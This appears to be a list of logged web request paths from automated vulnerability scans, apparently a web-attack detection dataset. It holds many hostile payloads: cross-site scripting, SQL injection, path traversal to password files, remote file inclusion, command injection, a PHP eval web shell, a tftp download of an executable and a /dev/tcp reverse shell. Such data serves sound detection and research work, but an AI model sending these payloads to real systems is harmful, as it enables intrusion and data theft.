"/<script>document.cookie=""testvowq=604;""</script>"
"/fpnpp5zg.pl?<meta http-equiv=set-cookie content=""testyias=101"">"
/scripts/weigh_keywords.php?etcdir=http://cirt.net/rfiinc.txt?
"/j4rdyhw8.php?<script>document.cookie=""testrluj=1420;""</script>"
"/help.php?q="";uname >q49727674 #"
/main.php?logout=/'
/main.php<?eval($_post['q54461335']);?eval($_post['q54461335']);?>
/scripts/forum.php3?id_article=1&id_forum=-1/**/union/**/select 412834017--
"/s7qus4g3.php?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
/script_saved/
/comments.php?scriptpath=http://192.168.202.96:8080/frznctvhi0i5??
/index.php?page=../../../../../../../../../../../../../../../../../winnt/system32/ipconfig.exe
/m2fpztty.pl?<script>cross_site_scripting.nasl</script>
/phpmyadmin/index.php?string='
"/tuwjta1w.htm?<script>document.cookie=""testpokn=7494;""</script>"
"/cleartrust/ct_logon.asp?ctauthmode=basic&ctloginerrormsg=xx&ct_orig_uri=\"">< script>alert(1)/script><\"""
/cgi-915/ppdscgi.exe
"/main.php?logout=""ping;-w;10000;-n;1;4.3.2.1&rem;"
/javascript/nude.exe
/y8pmygrp.do?<script>cross_site_scripting.nasl</script>
/scripts/counter.exe
"/vac1l5vm.htm?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
"/ybz5rz7a.php?<script>document.cookie=""testsbvw=6289;""</script>"
/examples/jsp/jsp2/jspx/web_store/web_store.cgi?page=../../../../../../etc/passwd\x00.html
/javascript/htpasswd.rhtml
"/ju0u7kfo.jspa?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
/examples/jsp/cal/misc/audio.php?recording=../version.inc
/grid_subscriptions2/
/scripts/neomail-prefs.pl?sessionid=nessus-session-0.neomail_sessionid_validation.nasl&action=addfolder&foldername=lnu3g9zkqrlule9mw
/examples/jsp/colors/hw3.cgi?daysonly=0).system('id').(
"/eei78ore.php3?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
../../../../../../../../../../../../etc/passwd
"/<meta http-equiv=set-cookie content=""testsixi=8451"">"
/javascript/hp.exe
"/qhvu0pdg.php?<script>document.cookie=""testchuc=2100;""</script>"
/cgi-bin/quickstore.cgi?page=../../../../../../../../../../etc/passwd\x00html&cart_id=
/main.php?logout=';uname >q89385457 #
/scripts/ggvfa_wichxq.asp
/eei78ore.php?<script>cross_site_scripting.nasl</script>
/javascript/.passwd.dll
/src/scripture.php?pageheaderfile=@rfiurl?pageheaderfile=@rfiurl?
"/securecgi-bin/csusercgi.exe?help+00.abcd.e.fghijk""""""><script>alert(""""""xss"""""")</script>"
"/index.php?config[""sipssys""]=http://192.168.202.118:8080/moclyxlwqyfjnp?"
/javascript/pc.exe
http://xxxxxxxxxxx.:80/<script>alert('vulnerable')</script>.cfm
"<meta http-equiv=set-cookie content=""testjvvf=7721"">"
/cgi-perl/fileseek2.cgi?foot=....//....//....//....//....//....//....//etc/passwd&head=
/nsn/..\util/ren.bas
/examples/servlets/servlet/faxsurvey?cat /etc/passwd
"/zabbix/frontends/php/locales.php?download=1&langto=1&extlang["".system('/./tmp/fetpkvinrp.sh+>+/dev/null+&').""]=1"
"/en-us/jnv890lt.jspa?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
/scripts/save.php?file_save=/etc/passwd
"/phpmyadmin/notify?from=nessus""|id"""
/examples/jsp/error/index.php?op=default&date=200607' union select 1
"/help.php?q=""ping;-w;11000;-n;1;4.3.2.1&rem;"
/scripts/zdbyw3dn3gh2.html
"/q703m78q.kspx?<script>document.cookie=""testvowq=604;""</script>"
"/main.php?stuff=""&ver;>q22147997&rem;"
"/help.php?q=""|ping\xa0-w\xa09000\xa0-n\xa01\xa04.3.2.1|rem\xa0"
/script/tick/allincludefortick.php?path_to_code=http://192.168.202.118:8080/zz5thkvtmlgl?
"/v3axg1p8.cfm?<meta http-equiv=set-cookie content=""testxagh=6987"">"
"/p043snfr.kspx?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
"/main.php?logout=""|ping;-w;11000;-n;1;1.2.3.4|rem;"
/javascript/stored.exe
/launch.asp?nfuse_application=<script>alert('vulnerable')</script>
"/cacti/dsweb/services/user-1""><body onload=alert('xerox_docushare_dsweb_xss.nasl')>"
"/p043snfr.do?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
/xfkun1ku.htm?<script>cross_site_scripting.nasl</script>
"/ghswfouu.cfm?<script>document.cookie=""testsqmm=5713;""</script>"
"/top.php?stuff=""rm\x09q12423295&rem\x09"
/main.php?stuff=&uname >q17531529 #
"/h5sc3gxy.asp?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
/javascript/reference.exe
"/interface/login/login_frame.php?site=""><!--#exec cmd=""dir \""--><"
/scripts/vzdybnanqpc3.asp
"/main.php?stuff=""&sleep\x099\x09#"
"/en-us/oie504mr.php3?<script>document.cookie=""testtpby=7052;""</script>"
/scripts/k0pxpjgnimox.cfm
/de3v2dd9.aspx?<script>cross_site_scripting.nasl</script>
"<meta http-equiv=set-cookie content=""testabrn=6368"">"
"/x7pclv4s.kspx?<meta http-equiv=set-cookie content=""testiulz=3709"">"
/scripts/quickstore.cgi?nessus&template=../../../../../../../../../../etc/passwd\x00html
/scripts/phprint.php?module=vtiger_lang_crm_lfi.nasl&action=1331918976&lang_crm=../../../../../../../../../../../..//etc/passwd\x00
/fnwhrxyd.htm?<script>cross_site_scripting.nasl</script>
/examples/jsp/sessions/forum.php?do=viewtopic&cat=1&topic=1&page=1?<script>foo</script
/sysuser/docmgr/mkdir.stm?path=<script>alert(document.cookie)</script>
/examples/servlets/servlet/index.php?lng=../system_footer&sensor_program=phpsysinfo_241.nasl
"/bxnyrhmh.aspx?<meta http-equiv=set-cookie content=""testmjct=1867"">"
/scripts/misc/info.php
"/ybz5rz7a.html?<script>document.cookie=""testsbvw=6289;""</script>"
"<script>document.cookie=""testbnli=1975;""</script>"
"/help.php?q=""&ping\x09-w\x098000\x09-n\x091\x094.3.2.1&rem\x09"
"/<meta http-equiv=set-cookie content=""testxagh=6987"">"
"/main.php?stuff=""rm q23955852 #"
/scripts/ubbthreads.php
"/azcrfs8d.jspa?<meta http-equiv=set-cookie content=""testjpdr=9205"">"
"/examples/servlets/servlet/?""><script>alert('struts_sa_surl_xss.nasl')</script>"
/b5xdqgz2.cgi?<script>cross_site_scripting.nasl</script>
"/169okeyj.mscgi?<script>document.cookie=""testxeoi=3573;""</script>"
/scripts/axdgpyi2bn6f.php
/scripts/msmmask.exe?mask=/nessus312940811.asp
/recordings/admin.php?style=../../../../../../../../../../../../etc/passwd\x00
/examples/jsp/checkbox/index.php?templates_dir=/etc/passwd\x00
/scripts/base_local_rules.php?dir=<script>alert('base_local_rules_xss.nasl-1332010394')</script>
/javascript/message.exe
/scripts/d3z7yywpyeoa.pl
"/top.php?stuff=""&ver&rem "
/examples/servlets/servlet/resetpw.php?email=../../../../../../../../../../../../etc/passwd
/javascript/solved.exe
"/index.php?action=search&searchfor=\""><script>alert('vulnerable')</script >"
"/main.php?stuff=""&ver;>q86839174&rem;"
"/oie504mr.nsf?<script>document.cookie=""testtpby=7052;""</script>"
"/nyvbv05h.cgi?<script>document.cookie=""testftxz=5980;""</script>"
/javascript/dbmodules.exe
/mail.php?id='/**/union/**/select/**/1
/examples/jsp/cal/web_store/web_store.cgi?page=../../../../../../etc/passwd\x00.html
"/fpnpp5zg.asp?<script>document.cookie=""testyias=101;""</script>"
ftp://192.168.28.202/*<apache_mod_proxy_ftp_glob_xss.nasl>
/raanw4ia.mscgi?<script>cross_site_scripting.nasl</script>
/cgibin/fileseek2.cgi?foot=&head=....//....//....//....//....//....//....//etc/passwd
/scripts/k0pxpjgnimox.shtml
"/h5i6crm3.mscgi?<meta http-equiv=set-cookie content=""testlihk=7070"">"
"/hipkz026.php?<script>document.cookie=""testyrbs=2855;""</script>"
"/6n7aacgg.cfm?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
/examples/jsp/num/demos/demo.browse.php?filename=/etc/passwd
"/jnt3f86c.htm?<meta http-equiv=set-cookie content=""testcmax=9270"">"
/help.php?q=uname\x09>q77267797\x09#
/bin/windmail.exe? -n c:\boot.ini hacker@hax0r.com | dir c:\\
/javascript/ppt.exe
"/dda2qr7j.pl?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
/j2kdmfw4.cfc?<script>cross_site_scripting.nasl</script>
/index.php?module=topics&func=view&topicid=-1 union select null
/examples/jsp/jsp2/jspx/index.php?user_langue=../../../../../../../../../../etc/passwd
/0rufe52p.php3?<script>cross_site_scripting.nasl</script>
/static//..\..\..\..\..\..\..\..\etc/passwd
/cgi-915/a1stats/a1disp3.cgi?../../../../../../../etc/passwd
"/main.php?stuff=""ping"
/_vti_bin/shtml.exe
"/help.php?q=""rm\x0cq43711515&rem\x0c"
"/main.php?stuff="";rm\x09q18442351\x09#"
/cgi-bin/..\xe0\x80\xaf..\xe0\x80\xaf..\xe0\x80\xaf..\xe0\x80\xaf..\xe0\x80\xaf../winnt/system32/cmd.exe?/c+dir+c:\+/og
"/main.php?stuff=""ping -w 10000 -n 1 4.3.2.1&rem "
"/nuh3zirz.php3?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
/bin/webcart/webcart.cgi?change=yes&code=phold&config=mountain&nextpage=;cat /etc/passwd|
"/o6ebbirj.cgi?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
/examples/jsp/cal/viewcvs.cgi/?cvsroot=<script>foo</script>
/javascript/~log.exe
/cgi-bin/index.php?op=default&date=200607' union select 1
/cgi-bin/index.php?x=browse&category='union select '1'
/script/plugins/phpgacl/admin/index.php?path_inc=http://192.168.202.118:8080/zz5thkvtmlgl?
"/phpmyadmin/documentation.html?'""=1"
/index.php?cid='
/cacti/nucleus/libs/pluginadmin.php?globals[dir_libs]=/etc/passwd\x00
/examples/jsp/sessions/sawmill6cl.exe?ho+{complete_version}
"/apavxugx.jsp?<script>document.cookie=""testdnbh=5237;""</script>"
/javascript/pool.exe
/examples/jsp/num/index.php?_language=../../../../../../../../../../etc/passwd\x00
"/aj3pf49c.cfm?<script>document.cookie=""testnofv=4170;""</script>"
"/main.php?logout=""&ping"
/imp/mailbox.php3?actionid=6&server=x&imapuser=x';somesql+--&pass=x
/scripts/weigh_keywords.php?etcdir=http://192.168.202.96:8080/4dckqcc0acprbz?
"/9ko6m4c8.php3?<meta http-equiv=set-cookie content=""testylik=3403"">"
/scripts/index.php?id='union/**/select/**/0
"/top.php?stuff=""&del q85387982 #"
/javascript/.passwd.csproj
/javascript/catalogs.exe
"/jdx255ea.cfc?<meta http-equiv=set-cookie content=""testziyq=5055"">"
/recordings/phf?qalias=x\x0a/bin/cat /etc/passwd
/examples/jsp/num/popup.php?include_path=/etc/passwd\x00
"/top.php?stuff=""\x0asleep\x097\x09#"
/scripts/index.php?module=topics&func=view&topicid=-1 union select null
"/en-us/9kr0ih0v.asp?<script>document.cookie=""testzgnm=1183;""</script>"
/javascript/running.exe
/cgi-bin/home/search.asp?nchannel='1
"/main.php?logout=""del q21367835&rem "
/cgi-bin/..\xc0\xaf..\xc0\xaf..\xc0\xaf..\xc0\xaf..\xc0\xaf../winnt/system32/cmd.exe?/c+dir+c:\+/og
/rv98iwjp.htm?<script>cross_site_scripting.nasl</script>
/cgi-bin/af.cgi?_browser_out=.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./etc/passwd
/phpmyadmin/documentation.html?phpmyadmin=/etc/passwd
/examples/jsp/error/calendar_admin.pl?config=|cat /etc/passwd|
/scripts/ck8pj.exe?/x+/c+tftp -i 192.168.202.118 get durjhxa1 qowmcdks.exe
/phpmyadmin/documentation.html?phpmyadmin=|cat /etc/passwd|
/main.php?logout='del\x09q76232693\x09#
/examples/jsp/num/install.php?newlang=../../cpg_error.log\x00
/javascript/closing.exe
/javascript/monitoring.exe
"/en-us/fo564rei.cgi?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
/prescription010507/
"/if69ddo1.nsf?<meta http-equiv=set-cookie content=""testiabz=5220"">"
/javascript/roaming.exe
"/6qbynt4f.asp?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
"/jnv890lt.jspa?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
"/6qbynt4f.kspx?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
"/3hlysl2x.pl?<meta http-equiv=set-cookie content=""testgjbe=8505"">"
"/main.php?logout=""ping;-w;11000;-n;1;4.3.2.1&rem;"
/examples/jsp/cal/calendar_admin.pl?config=|cat /etc/passwd|
"/cgi-bin/search.jsp?q=%""<script>alert(1332008604)</script>"
/rtph263dumpscript/
/scripts/neomail-prefs.pl?sessionid=nessus-session-0.neomail_sessionid_validation.nasl&action=addfolder&foldername=10nbpndw5e2ir1ncx
/cgi-bin/mlog.html?screen=/etc/passwd
"/main.php?stuff=""&ping\x09-w\x098000\x09-n\x091\x091.2.3.4&rem\x09"
/examples/jsp/jsp2/jspx/cal_make.pl?p0=../../../../../../../../../etc/passwd\x00
"/zroo33l4.php?<meta http-equiv=set-cookie content=""testiklc=904"">"
/top.php?stuff='\x0asleep\x097\x09#
"/scs86g1p.cfc?<script>document.cookie=""testquyx=2820;""</script>"
/d5a5renl.html?<script>cross_site_scripting.nasl</script>
/scripts/mapserv?map=mapserver_detect.nasl.map
/javascript/corporate.exe
/phpmyadmin/index.php?chemin=../../../../../../..//etc
/syshelp/stmex.stm?foo=123&bar=<script>alert(document.cookie)</script>
"/ju0u7kfo.php?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
/shoutbox/expanded.php?conf=../../../../../../../etc/passwd 
"/help.php?q=""rm\x09q12928131\x09#"
/en-us/account/more.php?id=1'
/examples/servlets/servlet/forum_2.php?msg=10&return=<script>foo</script>
/m2fpztty.idc?<script>cross_site_scripting.nasl</script>
"/l13b77e5.htm?<script>document.cookie=""testjvvf=7721;""</script>"
/javascript/.passwd.stackdump
/examples/jsp/num/mailbox.php3?actionid=6&server=x&imapuser=x';somesql&pass=x
/javascript/code.exe
"/manager/activatemember?activatecode=&member=""><script>alert('mvnforum_activatemember_xss.nasl')</script>"
"/o1zj4u9v.asp?<meta http-equiv=set-cookie content=""testabrn=6368"">"
/help.php?q='\x0auname #
/javascript/hit.exe
"/main.php?stuff=""ping\x09-w\x0910000\x09-n\x091\x091.2.3.4|rem\x09"
/subscriptions.doc
/include/scripts/run_auto_suspend.cron.php?dir=@rfiurl
/nyjgaorz.kspx?<script>cross_site_scripting.nasl</script>
"<meta http-equiv=set-cookie content=""testrluj=1420"">"
"/bugs/forgot_password.php?email=\""><script>alert(document.cookie)</script>"
"/jnt3f86c.dll?<meta http-equiv=set-cookie content=""testcmax=9270"">"
/phprint.php?module=vtiger_lang_crm_lfi.nasl&action=1331919142&lang_crm=../../vtigerservice.php\x00
"/moodle/filter/tex/texed.php?formdata=foo&pathname=foo"";ls+-l;rm+/tmp/ukirnkmpbn"""
/script_path/installation/index.php?mosconfig_absolute_path=http://192.168.202.96:8080/4dckqcc0acprbz??
/cgi-914/powerup/r.cgi?file=../../../../../../../../../../etc/passwd
/main.php?stuff=&ver
"/3j8echh0.php?<meta http-equiv=set-cookie content=""testfuqi=4189"">"
/subscriptions.config
/tlhhwkvs.exe/
/javascript/auth.exe
/awstats/awstats.pl?migrate=|echo;chmod 555 /tmp/urcppbumwm0;echo|awstats379091.txt
/opensiteadmin/scripts/classes/form.php?path=http://192.168.202.96:8080/4dckqcc0acprbz?\x00
/help.php?q=uname >q18373347 #
/lib/adodb_lite/adodb-perf-module.inc.php?last_module=zzz_adoconnection{}system(id);class zzz_adoconnection{}//
/speech-transcript/
"/zv8tv7h8.do?<script>document.cookie=""testcqwz=9752;""</script>"
"/t7tm4m0b.aspx?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
/manager/index.php?op=default&date=200607' union select 1
/help.php?q='\x0adel\x09q47355772\x09#
/examples/jsp/sessions/script/cat_for_gen.php?ad=1&ad_direct=../&m_for_racine=</option></select><?phpinfo();?>
"/m2fpztty.html?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
/phpmyadmin/sawmillcl.exe?ho+{complete_version}
/sscript/
/cgi-bin/webplus?script=/../../../../etc/passwd
/subscriptions.part
/g8nu2yy7.jspa?<script>cross_site_scripting.nasl</script>
/top.php?stuff=';rm q26271527 #
/scripts/coin_includes/constants.php?_ccfg[_pkg_path_incl]=/etc/passwd\x00
"/7dbjwpw6.cfm?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
/cgibin/pfdispaly.cgi?'\x0a/bin/cat /etc/passwd|'
"/top.php?stuff=""ping -w 7000 -n 1 1.2.3.4&rem "
/cgi-bin/index.php?p='nessus
"/main.php?stuff=""sleep 11 #"
"/en-us/odzk29aa.nsf?<script>document.cookie=""testtfvh=2141;""</script>"
/scripts/prnnucptkixl.php
"/ju0u7kfo.nsf?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
"/ydexw8by.x?<meta http-equiv=set-cookie content=""testulex=4996"">"
"/main.php?logout=""&uname >q45435148 #"
/cgi-win/ion-p?page=../../../../../etc/passwd
/cgibin/gw5/gwweb.exe?help=bad-request
"/j4rdyhw8.fts?<script>document.cookie=""testrluj=1420;""</script>"
/xoops232b/htdocs/xoops_lib/modules/protector/onupdate.php?mydirname=a(){}system('chmod+777+/tmp/djjeroppey.sh'); function v
/scripts/ylrvly9nh_pf.inc
/scripts/index.php?op=default&date=200607' union select 1
/scripts/vhost.php?action=logout&time=1331908735
/scripts/kfzqb5x87lvq.pl
"/newsletter_log.php?logfile=info.php&logtime=000060&email=<?php echo md5(""test""); ?>"
"/ao22ww7y.do?<script>document.cookie=""testqppc=8767;""</script>"
/javascript/globals.exe
/b5xdqgz2.exe?<script>cross_site_scripting.nasl</script>
"/jw64yq8u.x?<meta http-equiv=set-cookie content=""testylfu=1313"">"
/scripts/gitweb.pl
/main.php?logout='&del q16695623 #
/scripts/cal_cat.php?op=cats&year=2008&catview=1+union+select+1
"/uvazfs7p.pl?<meta http-equiv=set-cookie content=""testwtbo=4831"">"
/cgi-bin/insertorder.cfm?cfid=1&cftoken=1 union select 1
/examples/jsp/error/faq.php?action=&type=view&s=&id=-1' union select 0
/top.php?stuff='\x0auname\x09>q23871271\x09#
/manager/plog-download.php?dl_type=album&checked[]=' union select 'plogger_checked_sql_injection.nasl'
/javascript/subscription.exe
"/ju0u7kfo.asp?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
/manager/admin/addentry.php?phpbb_root_path=/etc/passwd\x00
/recordings/index.php?chemin=../../../../../../..//etc
/en-us/account/home/search.asp?nchannel='1
/javascript/_vti_cnf.exe
/0qhcnefz.aspx?<script>cross_site_scripting.nasl</script>
/ssxmagazinesubscription/
"/en-us/<img src=""javascript:alert(cross_site_scripting.nasl);"">.dll"
/examples/servlets/servlet/admin/components/com_fm/fm.install.php?lm_absolute_path=../../../&install_dir=limbo_com_fm_php_shell.nasl-1331904435
/examples/jsp/checkbox/newsscript.pl?mode=admin
"/en-us/ddoworrl.asp?<script>document.cookie=""testvlau=8517;""</script>"
/javascript/resolution.exe
/examples/jsp/jsp2/jspx/include/sql.php?include_path=/etc/passwd\x00
/scripts/vzdybnanqpc3.inc
/\x80../\x80../\x80../\x80../\x80../\x80../winnt/win.ini
/fcgi-bin/windmail.exe? -n c:\boot.ini hacker@hax0r.com | dir c:\\
/cgis/windmail.exe? -n c:\boot.ini hacker@hax0r.com | dir c:\\
/javascript/programs.exe
/help.php?q=&uname\x09>q82939622\x09#
"/t3af3tdz.dll?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
/scripts/index.php?board=nonexistant1419816536
"/b5xdqgz2.php3?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
"/bn857frh.aspx?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
"/s7qus4g3.cfm?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
/scgi-bin/.htpasswd
/phpmyadmin/starnet/modules/sn_allbum/slideshow.php?cmsdir=/etc/passwd\x00
/en-us/account/a1stats/a1disp3.cgi?/../../../../../../etc/passwd
/recordings/admin/general.php?mode=perlinfo&config[general][perl_binary]=cat /etc/passwd||
"/dslpwt15.do?<script>document.cookie=""testtkio=5454;""</script>"
/mom's ass/
/javascript/1994.exe
/scripts/qg9h0c0svvat.sh
"/606wkcop.kspx?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
/en-us/s7qus4g3.cfm?<script>cross_site_scripting.nasl</script>
"/vhzmaia2.cfm?<meta http-equiv=set-cookie content=""testkogj=3979"">"
/javascript/htpasswd.pl
"/main.php?stuff=""&ping"
"/i2n4v4rl.htm?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
/postnuke/html/modules.php?op=modload&name=news&file=article&sid=<script>alert('vulnerable');</script>
/scripts/search.scr.php?globals[pth][classes]=http://cirt.net/rfiinc.txt??
/en-us/account/index.php?act=arcade&do=stats&gameid=1'
/g8nu2yy7.kspx?<script>cross_site_scripting.nasl</script>
/javascript/document.sfish
"/help.php?q=""ping\xa0-w\xa08000\xa0-n\xa01\xa04.3.2.1&rem\xa0"
/7dbjwpw6.nsf?<script>cross_site_scripting.nasl</script>
/ny1b3qq4.x?<script>cross_site_scripting.nasl</script>
/faq.php?action=&type=view&s=&id=-1' union select 0
"/scs86g1p.cfc?<meta http-equiv=set-cookie content=""testquyx=2820"">"
/cgi-home/webcart/webcart.cgi?change=yes&code=phold&config=mountain&nextpage=;cat /etc/passwd|
/oncixdescription/
"/en-us/oie504mr.x?<script>document.cookie=""testtpby=7052;""</script>"
/main.php?logout=&ping;-w;7000;-n;1;4.3.2.1&rem;
"/search.jsp?q=%""<script>alert(1331905049)</script>"
/scripts/man-cgi?section=0&topic=ls;id
/xsskj3/
/main.php?stuff='\x0auname\x09>q47233887\x09#
/examples/jsp/jsp2/el/autohtml.php?op=modload&mailfile=x&name=../../../../../../../../etc/passwd
"/1r8cfrlf.kspx?<meta http-equiv=set-cookie content=""testydan=5106"">"
/scripts/mensajeitor.php
/passwdage/
/en-us/splunk_413_404error_xss.nasl-1331904921
"/bl8sefdm.jspa?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
/banners.php?op=emailstats&cid=1 and passwd like 'a%'/*
/script/
/scripts/breakcal/calendar.cgi
/javascript/pipermail.exe
/examples/jsp/checkbox/index.php?id='union/**/select/**/0
"/bmeun223.cfm?<script>document.cookie=""testhhwu=7044;""</script>"
"/t3af3tdz.do?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
"/yef5f3d5.jsp?<meta http-equiv=set-cookie content=""testcrcv=6167"">"
/main.php?frm_daynight=day&frm_passwd=&frm_referer=q72116194&frm_user=&scr_height=&scr_width=
/scripts/rot13sj.cgi?/etc/passwd
/examples/jsp/jsp2/jspx/index.php?gadget=glossary&action=view&term=<script>alert('jaws_xss.nasl');</script>
"/main.php?stuff="";rm q85142671 #"
/ywaxntrx.jspa?<script>cross_site_scripting.nasl</script>
"/help.php?q=""ver\xa0>q74458178&rem\xa0"
"/<meta http-equiv=set-cookie content=""testggad=2000"">"
"/eg2u8pbv.exe?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
/scripts/k0pxpjgnimox.php
/phpmyadmin/way-board/way-board.cgi?db=/etc/passwd\x00
/cacti/gadgets/blog/blogmodel.php?path=/etc/passwd\x00
/en-us/n9xlumt5.html?<script>cross_site_scripting.nasl</script>
/manager/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331904454
"/phpmyadminsearch_results.dot?search_query=nessus""><script>alert('dotcms_search_query_xss.nasl')</script>/"
/edit.jsp?page=user&editor=../../../install
/bin/pfdispaly.cgi?../../../../../../../../../../etc/passwd
/examples/jsp/sessions/supporter/tupdate.php?groupid=change&sg='
/bemarket/postscript/postscript.php?p_mode=http://192.168.202.118:8080/moclyxlwqyfjnp?
/scriptpath/footers.php?tinybb_footers=http://192.168.202.118:8080/zz5thkvtmlgl?
/manager/scp.dll/sendto?template=../../../../../../../../../../../../boot.ini\x00gwextranet_template_dir_traversal.nasl
/grey's anatomy 3x09 repack hdtv/
"/en-us/i686v90l.do?<meta http-equiv=set-cookie content=""testfutf=1550"">"
/phpmyadmin/scripts/setup.php
"/<script>document.cookie=""testylfu=1313;""</script>"
/7dbjwpw6.idc?<script>cross_site_scripting.nasl</script>
"/addvip.php?msetstr[""progsdir""]=http://192.168.202.96:8080/swgnhpydbq0t?"
"/esmozg5d.dll?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
/javascript/property.exe
/prescription-xanax/
"/if69ddo1.php?<script>document.cookie=""testiabz=5220;""</script>"
/scripts/troops.cgi
/javascript/win32.exe
/javascript/compliance.exe
/scripts/index.php?op=viewalbum&albumid=-1/**/union/**/select/**/0
/phpmyadmin/index.php?gadget=glossary&action=viewterm&term=<script>alert('jaws_xss.nasl');</script>
/examples/jsp/sessions/index.php?template=../../../loudblog/custom/config.php\x00
/phprint.php?module=vtiger_lang_crm_lfi.nasl&action=1331908691&lang_crm=../../vtigerservice.php\x00
"/main.php?stuff=""&del\x0cq27346825&rem\x0c"
"/9o6g5vkn.htm?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
/'stoked' gets to the heart of extreme athletics/
"/0u75ldxq.php3?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
/examples/jsp/jsp2/jspx/config.php?path[docroot]=/etc/passwd\x00
"/fmnveedu.idc?<meta http-equiv=set-cookie content=""testgfbr=7014"">"
"/help.php?q=""&ping\x0c-w\x0c9000\x0c-n\x0c1\x0c1.2.3.4&rem\x0c"
/javascript/pii.exe
/javascript/ubb.exe
"/j4drbkil.idc?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
/examples/jsp/jsp2/jspx/index.php?show=/etc/passwd
"/1qwv2p5p.x?<script>document.cookie=""testvqcy=252;""</script>"
/scriptpath/footers.php?tinybb_footers=http://192.168.202.96:8080/ipb5ri?
"/main.php?stuff=""&rm q23549573 #"
/script pack/
"/rpxyx07v.dll?<script>document.cookie=""testbnli=1975;""</script>"
/pohentermine-prescription/
"/eventum/forgot_password.php?email=\""><script>alert(document.cookie)</script>"
"/ddoworrl.do?<script>document.cookie=""testvlau=8517;""</script>"
/megabook/admin.cgi?login=<script>alert('vulnerable')</script>
/initscripts/
/gazette-subscription/
/htbin/sensepost.exe?/c+dir
"/bmeun223.idc?<meta http-equiv=set-cookie content=""testhhwu=7044"">"
/examples/jsp/jsp2/jspx/showcat.php?cat=1'
"/b5xdqgz2.idc?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
/examples/jsp/cal/index.php?entry='
/javascript/contents.exe
/pirvate/ltwpdfmonth.php?ltw_config['include_dir]=http://192.168.202.118:8080/moclyxlwqyfjnp?
/javascript/decl.exe
/recordings/base_local_rules.php?dir=<script>alert('base_local_rules_xss.nasl-1331918989')</script>
/ttxssh2_210/
/projects/1/repository/annotate?rev=`0<&208-;exec 208<>/dev/tcp/192.168.202.118/26475;sh <&208 >&208 2>&208`
"/en-us/7o5qp766.aspx?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
/main.php?logout=ver\x0c>q59849218&rem\x0c
/scripts/secure.php?cfgprogdir=/etc/passwd\x00
/index.php?module=topics&func=view&topicid=-1 union select null
/cgi.cgi/fileseek.cgi?foot=;cat /etc/passwd&head=
/path_script/createurl.php?formurl=http://192.168.202.96:8080/swgnhpydbq0t?
/index.php?op=default&date=200607' union select 1
/xnoscript/
/cacti/apa_phpinclude.inc.php?apa_module_basedir=/etc/passwd\x00
/examples/servlets/servlet/anacondaclip.pl?template=../../../../../../../../../../../../../../../etc/passwd
/javascript/tuscany.exe
/main.php?stuff=ver
"/zv8tv7h8.asp?<meta http-equiv=set-cookie content=""testcqwz=9752"">"
"/main.php?stuff=""ping"
"/help.php?q=""\x0duname >q75726259 #"
"/v3axg1p8.idc?<meta http-equiv=set-cookie content=""testxagh=6987"">"
"/top.php?stuff=""ping\x0c-w\x0c10000\x0c-n\x0c1\x0c1.2.3.4&rem\x0c"
"/main.php?logout=""del\x0cq37726783&rem\x0c"
/texis.exe/?-dump
/launch.jsp?nfuse_application=<script>alert('vulnerable')</script>
/phpmyadmin/index.php/1'
/examples/jsp/jsp2/el/index.php?configfile=../../../../../../../../../etc/passwd
"/javascript/.htaccess.sfish/''''"""""""""
"/en-us/9kr0ih0v.dll?<script>document.cookie=""testzgnm=1183;""</script>"
/cgi-home/pfdispaly.cgi?'\x0a/bin/cat /etc/passwd|'
/scripts/axdgpyi2bn6f.php3
/fcgi-bin/gwweb.exe?help=bad-request
"/top.php?stuff=""&del\xa0q12371867&rem\xa0"
/examples/jsp/checkbox/www/delivery/ac.php?bannerid=-1331904367+or+1=1+--+';passthru(base64_decode($_server[http_nessus_wfppkgt4]));die;/*
"/nyvbv05h.html?<meta http-equiv=set-cookie content=""testftxz=5980"">"
"/cgi-bin/server.pt?open=space&name="";}</script><script>alert('plumtree_name_xss.nasl')</script>"
"/chat/register.php?register=yes&username=overg&email=<script>alert (\""vulnerable\"")</script>&email1=<script>alert (\""vulnerable\"")</script>"
/scripts/image.php?src=system/config/localconfig.php
/archive.php?scriptpath=http://192.168.202.118:8080/2aibfaczmac8??
/..\xc1\xc1..\xc1\xc1..\xc1\xc1..\xc1\xc1..\xc1\xc1../winnt/system32/cmd.exe?/c+dir+c:\+/og
/main.php?frm_daynight=q51426141&frm_passwd=&frm_referer=http%3a//192.168.23.202/main.php%3flogout%3d1&frm_user=&scr_height=&scr_width=
"/bzuf9ozq.mscgi?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
/boilerplate.asp?nfuse_template=../../boot.ini&amp;nfuse_currentfolder=/sslx0020directories|-|0|404_object_not_found
